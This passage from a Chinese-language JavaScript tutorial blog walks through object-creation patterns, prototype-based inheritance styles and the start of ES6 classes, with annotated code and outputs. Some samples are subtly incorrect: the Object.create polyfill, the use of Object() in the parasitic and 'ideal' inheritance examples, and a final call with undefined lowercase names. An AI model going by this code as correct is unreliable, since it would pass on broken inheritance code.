function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line">var person1 = new createobj(&apos;gray&apos;,25);</div><div class="line">person1.sayName(); //gray</div><div class="line"></div><div class="line">console.log(person1 instanceof createobj)//true</div><div class="line">console.log(person1 instanceof Object)//true</div><div class="line"></div><div class="line">console.log(window.name)//&apos;&apos;</div><div class="line">var person2 = createobj(&apos;black&apos;,26);</div><div class="line">console.log(person2) //undefined</div><div class="line">console.log(window.name) //black</div><div class="line">console.log(person1.sayName == window.sayName)//false</div><div class="line"></div><div class="line">var person3 = new createobj(&apos;orange&apos;,25);</div><div class="line">console.log(person1.sayName == person3.sayName)//false</div><div class="line"></div><div class="line">console.log(person1.constructor == createobj)//true</div><div class="line">console.log(person3.constructor == person1.constructor)//true</div></pre></td></tr></table></figure>
<p>1、构造函数的实例均指向构造函数。例：person1、person3的constructor均指向createobj)<br>2、不使用new 关键字调用构造函数,构造函数的方法和属性会挂到window上面。例：person2<br>3、定义在构造函数上的方法,创建不同实例后,不同实例各自拥有自己的该方法,不同实例之间构造函数方法不相等,不共享</p>
<p>使用构造函数创建对象,如果相让对象方法在不同实例实现共享,则在定义方法时，采用引用函数的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;</div><div class="line">  this.name = name;</div><div class="line">  this.age = age;</div><div class="line">  this.sayName = sayName;</div><div class="line">&#125;</div><div class="line">function sayName()&#123;</div><div class="line">   console.log(this.name)</div><div class="line">&#125;</div><div class="line">var person1 = new createobj(&apos;gray&apos;,25);</div><div class="line">var person3 = new createobj(&apos;orange&apos;,25);</div><div class="line">console.log(person1.sayName == person3.sayName)//true</div></pre></td></tr></table></figure></p>
<p>缺点:若对象需要定义多个方法则需要创建多个全局函数供构造函数引用,失去封装性</p>
<h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><p>在对象的prototype中定义的属性和方法,可以在所有实例中共享<br>定义方法一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;&#125;</div><div class="line">createobj.prototype.name = &apos;black&apos;;</div><div class="line">createobj.prototype.age = 26;</div><div class="line">createobj.prototype.sayName = function()&#123;</div><div class="line">   console.log(this.name)</div><div class="line">&#125;</div><div class="line">var person1 = new createobj();</div><div class="line">var person2 = new createobj();</div><div class="line">person1.sayName();//black</div><div class="line">person2.sayName();//black</div><div class="line">console.log(person1.sayName == person2.sayName)//true</div><div class="line"></div><div class="line">console.log(person1.constructor == createobj)//true</div><div class="line">console.log(person2.constructor == person1.constructor)//true</div><div class="line"></div><div class="line"></div><div class="line">console.log(person1.age)   //26 来自原型</div><div class="line">person1.age = 27;          //相当于创建了一个实例属性</div><div class="line">console.log(person1.age)   //27 来自实例属性</div><div class="line">console.log(person2.age)   //26 来自原型</div><div class="line">delete person1.age;        //删除实例属性</div><div class="line">console.log(person1.age)   //26 来自原型</div><div class="line">delete person1.age;        //不能删除原型属性</div><div class="line">console.log(person1.age)   //26</div><div class="line">console.log(person2.age)   //26</div><div class="line"></div><div class="line">console.log(person1 == createobj.prototype)//false</div><div class="line">console.log(person1.prototype == createobj.prototype)//false</div><div class="line">console.log(createobj.prototype.isPrototypeOf(person1))//true</div><div class="line">console.log(person1.prototype) //undefined</div><div class="line">console.log(Object.getPrototypeOf(person1));//createobj.prototype</div><div class="line"></div><div class="line">console.log(person1.hasOwnProperty(&apos;name&apos;));//false</div><div class="line">console.log(&apos;name&apos; in person1);//true</div><div class="line">console.log(Object.keys(createobj.prototype));//[&quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</div><div class="line">console.log(Object.getOwnPropertyNames(createobj.prototype));//[&quot;constructor&quot;, &quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</div></pre></td></tr></table></figure></p>
<p><img src="/image/obj1.png" alt="obj1"><br>1、实例的内部指针[[Prototype]] 会指向构造函数的原型对象,它是不能直接访问的<br>2、构造函数的prototype也会指向构造函数的原型对象,但他是构造函数的一个属性，可以直接访问<br>3、Object.getPrototypeOf(实例名); 返回实例的原型对象 .即[[Prototype]]指向的对象<br>4、实例名.hasOwnProperty(属性名字符串) ; 只检查实例的实例属性中是否有该属性,没有的话,返回false,可用于检查该属性在实例属性中，还是在原型属性中<br>5、在获取属性值时，实例属性中有该属性就取该实例属性的值,没有则用原型属性值,原型属性也没有的话则返回undefined<br>6、实例属性可用delete删除,实例无法更改原型属性的值<br>7、属性名字符串 in 实例名; 检查实例和原型所有属性中是否有该属性,有的话就返回true;for-in循环可枚举的属性,包括实例属性和原型属性<br>8、Object.keys(对象名);返回对象可枚举属性的字符串数组<br>9、Object.getOwnPropertyNames(对象名);返回所有对象的实例属性,无论它是否枚举</p>
<p>定义方法二<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function createobj()&#123;&#125;</div><div class="line">createobj.prototype=&#123;</div><div class="line">  name:&apos;seven&apos;,</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">var person1 = new createobj();</div><div class="line">person1.sayName();//seven</div><div class="line">console.log(person1.constructor == createobj);//false</div><div class="line">console.log(person1.constructor == createobj.prototype);//false</div><div class="line">console.log(person1.constructor == Object);//true</div><div class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</div><div class="line">console.log(person1.constructor);//function object()&#123;&#125;</div><div class="line"></div><div class="line">console.log(person1 instanceof Object);//true</div><div class="line">console.log(person1 instanceof createobj);//true</div></pre></td></tr></table></figure></p>
<p>1、将挂在构造函数原型上的属性以一个对象的形式，一起赋给构造函数原型,即构造函数原型被赋值为一个对象<br>2、构造函数原型被Object创建,实例、构造函数的原型对象的构造函数为Object对象<br>3、若在定义原型对象时,指定原型对象的constructor,则对象实例的constructor也会跟着指到相应的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">function createobj()&#123;&#125;</div><div class="line">createobj.prototype=&#123;</div><div class="line">  constructor:createobj, //明确指出,同时特性的枚举属性会被设置为true,默认为false</div><div class="line">  name:&apos;seven&apos;,</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">var person1 = new createobj();</div><div class="line">person1.sayName();//seven</div><div class="line">console.log(person1.constructor == createobj);//true</div><div class="line">console.log(person1.constructor == createobj.prototype);//false</div><div class="line">console.log(person1.constructor == Object);//false</div><div class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</div><div class="line">console.log(person1.constructor);//function createobj()&#123;&#125;</div><div class="line"></div><div class="line">console.log(person1 instanceof Object);//true</div><div class="line">console.log(person1 instanceof createobj);//true</div></pre></td></tr></table></figure></p>
<p>4、 实例中的指针指向原型，不指向构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">function createobj()&#123;&#125;</div><div class="line"></div><div class="line">var person1 = new createobj();</div><div class="line">console.log(person1 instanceof createobj);//true</div><div class="line">createobj.prototype=&#123;</div><div class="line">  constructor:createobj,</div><div class="line">  name:&apos;seven&apos;,</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">//person1.sayName();//person1.sayName is not a function</div><div class="line">console.log(person1.constructor == createobj);//true</div><div class="line">console.log(person1.constructor == createobj.prototype);//false</div><div class="line">console.log(person1.constructor == Object);//false</div><div class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</div><div class="line">console.log(person1.constructor);//function createobj()&#123;&#125;</div><div class="line"></div><div class="line">console.log(person1 instanceof Object);//true</div><div class="line">console.log(person1 instanceof createobj);//false</div></pre></td></tr></table></figure></p>
<p><img src="/image/obj2.png" alt="obj2"><br>对象生成实例后,再去重写构造函数的原型对象,会将构造函数的原型对象指向后来被赋的对象,<br>切断与旧的原型对象之间的关系，新的原型对象与实例没有任何关系,实例仍引用旧的原型对象</p>
<p>原型方法可用于修改添加原生对象的属性方法<br>缺点:在原型对象prototype中的属性方法全都共享,当更改一个实例中的属性值时,其他实例一起变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">//定义一</div><div class="line">function createobj(name,age)&#123;&#125;</div><div class="line">createobj.prototype.name = [1,2];</div><div class="line">createobj.prototype.sayName = function()&#123;</div><div class="line">   console.log(this.name)</div><div class="line">&#125;</div><div class="line">var person1 = new createobj();</div><div class="line">var person2 = new createobj();</div><div class="line">person1.sayName();//[1, 2]</div><div class="line">person2.sayName();//[1, 2]</div><div class="line">person1.name.push(3);</div><div class="line">person1.sayName();//[1, 2, 3]</div><div class="line">person2.sayName();//[1, 2, 3]</div><div class="line">//定义二</div><div class="line">function createobj()&#123;&#125;</div><div class="line">createobj.prototype=&#123;</div><div class="line">  constructor:createobj,</div><div class="line">  name:[1,2],</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">var person1 = new createobj();</div><div class="line">var person2 = new createobj();</div><div class="line">console.log(person1.name)//[1, 2]</div><div class="line">console.log(person2.name)//[1, 2]</div><div class="line">person1.name.push(3);</div><div class="line">console.log(person1.name)//[1, 2, 3]</div><div class="line">console.log(person2.name)//[1, 2, 3]</div></pre></td></tr></table></figure></p>
<h2 id="构造函数-原型模式"><a href="#构造函数-原型模式" class="headerlink" title="构造函数+原型模式"></a>构造函数+原型模式</h2><p>构造函数定义实例属性，<br>原型模式定义方法和共享属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;</div><div class="line">  this.name = name;</div><div class="line">  this.age = age;</div><div class="line">  this.friends = [1,2];</div><div class="line">&#125;</div><div class="line">createobj.prototype=&#123;</div><div class="line">  constructor:createobj,</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">var person1 = new createobj(&apos;halo&apos;,24);</div><div class="line">var person2 = new createobj(&apos;jack&apos;,25);</div><div class="line">person1.friends.push(3);</div><div class="line">console.log(person1.friends);//[1, 2, 3]</div><div class="line">console.log(person2.friends);//[1, 2]</div></pre></td></tr></table></figure></p>
<p>是用来定义引用类型的一种默认模式</p>
<h2 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;</div><div class="line">  this.name = name;</div><div class="line">  this.age = age;</div><div class="line">  if(typeof this.sayName !=&apos;function&apos;)&#123;</div><div class="line">    createobj.prototype.sayName = function()&#123;</div><div class="line">     console.log(this.name)</div><div class="line">  &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">var person1 = new createobj(&apos;halo&apos;,24);</div><div class="line">var person2 = new createobj(&apos;jack&apos;,26);</div><div class="line">person1.sayName();//halo</div><div class="line">person2.sayName();//jack</div><div class="line"></div><div class="line">//修改原型</div><div class="line">createobj.prototype.sayName = function()&#123;</div><div class="line">     console.log(&apos;111&apos;)</div><div class="line">  &#125;</div><div class="line">person1.sayName();//111</div><div class="line">person2.sayName();//111</div><div class="line"></div><div class="line">//使用字面方式重写</div><div class="line">createobj.prototype=&#123;</div><div class="line">  constructor:createobj,</div><div class="line">  sayName:function()&#123;</div><div class="line">    console.log(222)</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">var person3 = new createobj(&apos;kitty&apos;,24);</div><div class="line">person1.sayName();//111</div><div class="line">person2.sayName();//111</div><div class="line">person3.sayName();//222</div><div class="line">console.log(person1.prototype);//undefined</div><div class="line"></div><div class="line">//重写一个原型方法</div><div class="line">person1.sayName=function()&#123;</div><div class="line">  console.log(&apos;333&apos;);</div><div class="line">&#125;</div><div class="line">person1.sayName();//333</div><div class="line">person2.sayName();//111</div></pre></td></tr></table></figure>
<p>1、判断sayName函数是否存在的语句，只会在初次调用构造函数的时候运行，即第一次创建实例的时候运行，<br>  运行过后，构造函数原型中就会存在sayName函数，即完成初始化，之后就不会在运行<br>2、对原型模式定义的方法属性能够在所有实例中立即得到放映<br>3、如果对构造函数原型使用字面方式重写，将切断已有实例与构造函数原型的联系，<br>   已有实例会指向就原型对象，新建实例会指向新原型对象<br>4、在一个实例中重写一个原型方法，不会影响原型对象方法，其他实例和新建实例仍会调用原型对象方法</p>
<h2 id="稳妥构造函数"><a href="#稳妥构造函数" class="headerlink" title="稳妥构造函数"></a>稳妥构造函数</h2><p>创建对象的实例方法，不使用this<br>不使用new调用构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;  //构造函数</div><div class="line">  var o=new Object();</div><div class="line">  o.name = name;</div><div class="line">  o.age = age;</div><div class="line">  o.sayName = function()&#123;</div><div class="line">    console.log(this.name)；</div><div class="line">    console.log(this == o) </div><div class="line">  &#125;;</div><div class="line">  return o;</div><div class="line">&#125;</div><div class="line">var person1 = createobj(&apos;gray&apos;,25);</div><div class="line">person1.sayName()//gray true</div><div class="line"></div><div class="line">console.log(person1 instanceof createobj) //false</div></pre></td></tr></table></figure></p>
<p>只用通过sayName函数访问传入到构造函数中的原始成员</p>
<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="实例原型链模式"><a href="#实例原型链模式" class="headerlink" title="实例原型链模式"></a>实例原型链模式</h2><p>继承函数的原型被赋值为祖先函数的实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">//祖先函数</div><div class="line">function Superfn()&#123;</div><div class="line">  this.pro = true;</div><div class="line">  this.color = [1,2];</div><div class="line">  this.getsuper = function()&#123;</div><div class="line">    console.log(&apos;aaa&apos;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">Superfn.prototype.getsuper=function()&#123;</div><div class="line">  console.log(&apos;bbb&apos;);</div><div class="line">&#125;</div><div class="line">//继承函数</div><div class="line">function Subfn()&#123;</div><div class="line">  this.subpro = false;</div><div class="line">  this.getsuper = function()&#123;</div><div class="line">    console.log(&apos;000&apos;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">Subfn.prototype = new Superfn();</div><div class="line">Subfn.prototype.getsuper = function()&#123;</div><div class="line">    console.log(&apos;ccc&apos;)</div><div class="line">  &#125;</div><div class="line">var ins = new Subfn();</div><div class="line">ins.getsuper();</div><div class="line"></div><div class="line">console.log(ins instanceof Object); //true</div><div class="line">console.log(ins instanceof Superfn); //true</div><div class="line">console.log(ins instanceof Subfn); //true</div><div class="line">console.log(Object.prototype.isPrototypeOf(ins)); //true</div><div class="line">console.log(Superfn.prototype.isPrototypeOf(ins)); //true</div><div class="line">console.log(Subfn.prototype.isPrototypeOf(ins)); //true</div><div class="line"></div><div class="line">var ins1 = new Subfn();</div><div class="line">console.log(ins.color)//[1,2]</div><div class="line">console.log(ins1.color)//[1,2]</div><div class="line">ins1.color.push(4);</div><div class="line">console.log(ins.color)//[1,2,4]</div><div class="line">console.log(ins1.color)//[1,2,4]</div></pre></td></tr></table></figure></p>
<p>1.继承函数实例的属性/方法调用顺序：<br>自己定义的-&gt;继承函数实例-&gt;继承函数prototype-&gt;祖先函数实例属性-&gt;祖先函数prototype<br>2.因为所有引用类型默认继承object,所以调用toString等方法时，其实调用的的是object的prototype<br>3.重写原型中祖先函数的方法,一定要在继承函数原型被赋值祖先函数实例之后，相当于用实例方法覆盖原型方法<br>但注意不能用字面量方法重写继承函数原型,这样会导致继承函数原型重新指向新对象，切断与祖先函数联系<br>4.因为继承函数prototype指向祖先函数实例时,祖先函数所有属性相当于继承函数prototype属性，<br>构造函数原型的属性会被所有实例共享，所以创建继承函数实例时,<br>不能像祖先函数的构造函数中传递参数,因为会导致其他实例同时共享这些参数导致的后果</p>
<h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>使用apply()或者call()方法。在继承函数构造函数中调用祖先函数构造函数，这样，<br>在new 一个继承函数实例时，就会去执行祖先函数中所有对象初始化代码，每个实例都会具有自己的祖先函数属性的副本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">function Superfn(time)&#123;</div><div class="line">  this.color = [1,2];</div><div class="line">  this.time = time;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Superfn.prototype.getsuper=function()&#123;</div><div class="line">  console.log(&apos;bbb&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function Subfn()&#123;</div><div class="line">  Superfn.call(this,&apos;11:23:30&apos;);</div><div class="line">  this.age = 29;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var ins = new Subfn();</div><div class="line">var ins1 = new Subfn();</div><div class="line">console.log(ins.color) //[1, 2]</div><div class="line">console.log(ins1.color)//[1, 2]</div><div class="line">ins1.color.push(4);</div><div class="line">console.log(ins.color)//[1, 2]</div><div class="line">console.log(ins1.color)//[1, 2, 4]</div><div class="line"></div><div class="line">console.log(ins.time);//&quot;11:23:30&quot;</div><div class="line">console.log(ins.age);//29</div><div class="line"></div><div class="line">ins.getsuper();//ins.getsuper is not a function</div></pre></td></tr></table></figure></p>
<p>1、可以像祖先函数构造函数中传递参数；<br>2、定义继承函数自己的属性必须放在调用祖先函数之后，防止祖先函数重写继承函数属性<br>缺点： 所有的属性只能使用构造函数模式定义，而且,继承函数实例，不能调用祖先函数原型上的方法</p>
<h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>在继承函数构造函数中调用祖先函数，实现属性继承<br>将继承函数的原型赋值为祖先函数实例，实现方法复制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function Superfn(time)&#123;</div><div class="line">  this.color = [1,2];</div><div class="line">  this.time = time;</div><div class="line">&#125;</div><div class="line">Superfn.prototype.getsuper=function()&#123;</div><div class="line">  console.log(&apos;bbb&apos;);</div><div class="line">&#125;</div><div class="line">function Subfn()&#123;</div><div class="line">  Superfn.call(this,&apos;11:23:30&apos;);</div><div class="line">  this.age = 29;</div><div class="line">&#125;</div><div class="line">Subfn.prototype= new Superfn();</div><div class="line">var ins = new Subfn();</div><div class="line">var ins1 = new Subfn();</div><div class="line">console.log(ins.color)</div><div class="line">console.log(ins1.color)</div><div class="line">ins1.color.push(4);</div><div class="line">console.log(ins.color)</div><div class="line">console.log(ins1.color)</div><div class="line"></div><div class="line">console.log(ins.time);//&quot;11:23:30&quot;</div><div class="line">console.log(ins.age);//29</div><div class="line"></div><div class="line">ins.getsuper();//bbb</div></pre></td></tr></table></figure></p>
<p>缺点：调用了两次Superfn()，初始化时，Subfn.prototype中的Superfn的实例属性会被构造函数中创建的Superfn的实例属性覆盖，<br>重复创建，没必要</p>
<h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><p>Object.creat()方法原理像如下函数<br>function object(o){<br>    function F(){<br>      F.prototype = o;<br>    }<br>  return new F();<br>}<br>原型式继承 即使用Object.creat(祖先对象)定义实例,实例会共享祖先对象属性方法，通过添加第二个参数，覆盖祖先对象属性，或新增属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Superfn=&#123;</div><div class="line">  color:[&apos;red&apos;,&apos;green&apos;],</div><div class="line">  getsuper:function()&#123;</div><div class="line">  console.log(222);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var test = Object.create(Superfn,&#123;getsuper:&#123;value:function()&#123;console.log(111)&#125;&#125;&#125;);</div><div class="line">var test1 = Object.create(Superfn,&#123;color:&#123;value:[1,2]&#125;,name:&#123;value:&apos;jack&apos;&#125;&#125;);</div><div class="line">console.log(test.color);//[&apos;red&apos;,&apos;green&apos;]</div><div class="line">console.log(test1.color,test1.name); //[1,2] jack</div><div class="line">console.log(test.name);//undefined</div><div class="line">test.getsuper(); //111</div><div class="line">test1.getsuper();//222</div></pre></td></tr></table></figure></p>
<h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function createAnthoer(oriobj)&#123;</div><div class="line">  var clone = Object(oriobj);//创建oriobj对象副本</div><div class="line">  clone.sayHi=function()&#123;//以某种方式增强这个对象，例如定义自己的方法</div><div class="line">    console.log(&apos;hi&apos;)</div><div class="line">  &#125;</div><div class="line">  return clone;</div><div class="line">&#125;</div><div class="line">var Superfn=&#123;</div><div class="line">  color:[&apos;red&apos;,&apos;green&apos;],</div><div class="line">&#125;</div><div class="line">var test = createAnthoer(Superfn);</div><div class="line">test.sayHi()//hi</div><div class="line">console.log(test.color);//[&quot;red&quot;, &quot;green&quot;]</div></pre></td></tr></table></figure>
<h2 id="最理想继承-寄生组合式继承"><a href="#最理想继承-寄生组合式继承" class="headerlink" title="最理想继承-寄生组合式继承"></a>最理想继承-寄生组合式继承</h2><p>对比组合式继承<br>仅调用一次superfn函数，避免在Subfn.prototype中创建多余superfn实例属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">function inhertPrototype(subfn,superfn)&#123;</div><div class="line">  var prototype = Object(superfn.prototype);//创建对象 ，仅继承祖先函数原型</div><div class="line">  prototype.constructor = subfn;//增强对象</div><div class="line">  subfn.prototype = prototype;//指定对象</div><div class="line">&#125;</div><div class="line">function Superfn(name)&#123;</div><div class="line">  this.color = [1,2];</div><div class="line">  this.name = name;</div><div class="line">&#125;</div><div class="line">Superfn.prototype.getsuper=function()&#123;</div><div class="line">  console.log(&apos;bbb&apos;);</div><div class="line">&#125;</div><div class="line">function Subfn(name,age)&#123;</div><div class="line">  Superfn.call(this,name); //仅继承祖先函数实例属性，不会继承祖先函数原型</div><div class="line">  this.age = age;</div><div class="line">&#125;</div><div class="line">Subfn.prototype.getsuper=function()&#123;</div><div class="line">  console.log(&apos;ccc&apos;);</div><div class="line">&#125;</div><div class="line">inhertPrototype(subfn,superfn);</div></pre></td></tr></table></figure></p>
<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类的定义相当于es5 对象构造函数的另一种写法，一种新语法<br>es5 的继承，实质是先创造子类的实例对象this，然后再将父类的方法添加到this上面<br>es6 类的继承，实质是先创造父类的实例对象this（必须先调用super方法），然后再用子类的构造函数修改this</p>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div 